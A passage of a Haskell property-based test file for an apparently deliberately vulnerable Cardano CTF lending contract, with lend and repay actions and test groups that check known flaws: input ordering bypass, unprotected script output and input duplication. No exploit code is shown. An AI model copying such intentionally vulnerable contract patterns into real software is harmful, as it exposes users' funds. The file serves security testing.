      case result of
        [] -> fail "No loan request found"
        ((txIn, value, datum) : _) -> do
          let txBody = execBuildTx $ lendFunds Defaults.networkId txIn datum value Wallet.w2
          -- Use w1 for balance because threat model rebalancer uses w1
          runExceptT (balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []) >>= \case
            Left err -> fail $ "Failed to lend: " ++ show err
            Right _ -> pure ()
    RepayAction -> do
      result <- findLendingUtxos
      case result of
        [] -> fail "No loan found for repayment"
        ((txIn, _, datum) : _) -> do
          let txBody = execBuildTx $ repayLoan txIn datum Wallet.w1
          runExceptT (balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []) >>= \case
            Left err -> fail $ "Failed to repay: " ++ show err
            Right _ -> pure ()

  -- Simplified validation
  validate _model = pure True

  monitoring _state _action prop = prop

  -- NOTE: threatModels is empty for lending because RepayAction consumes the script
  -- UTxO without creating a new one. This causes 100% test discard since threat
  -- models require a script output.
  --
  -- The vulnerabilities are tested separately with standalone tests:
  -- - propLendingVulnerableToInputOrdering (input ordering bypass)
  -- - propLendingUnprotectedOutput (unprotected script output via expectFailure)
  threatModels = []

-- ----------------------------------------------------------------------------
-- Test tree
-- ----------------------------------------------------------------------------

-- | All CTF Lending tests grouped together
aikenLendingTests :: RunOptions -> TestTree
aikenLendingTests runOpts =
  testGroup
    "ctf lending"
    [ aikenLendingUnitTests
    , testGroup
        "property tests"
        [ propRunActionsWithOptions @LendingModel
            "property-based testing"
            runOpts
        , testProperty
            "vulnerable to input ordering bypass"
            (propLendingVulnerableToInputOrdering runOpts)
        , testProperty
            "vulnerable to unprotected script output (expectFailure)"
            (QC.expectFailure $ propLendingUnprotectedOutput runOpts)
        , testProperty
            "vulnerable to input duplication"
            (propLendingVulnerableToInputDuplication runOpts)
        ]
    ]
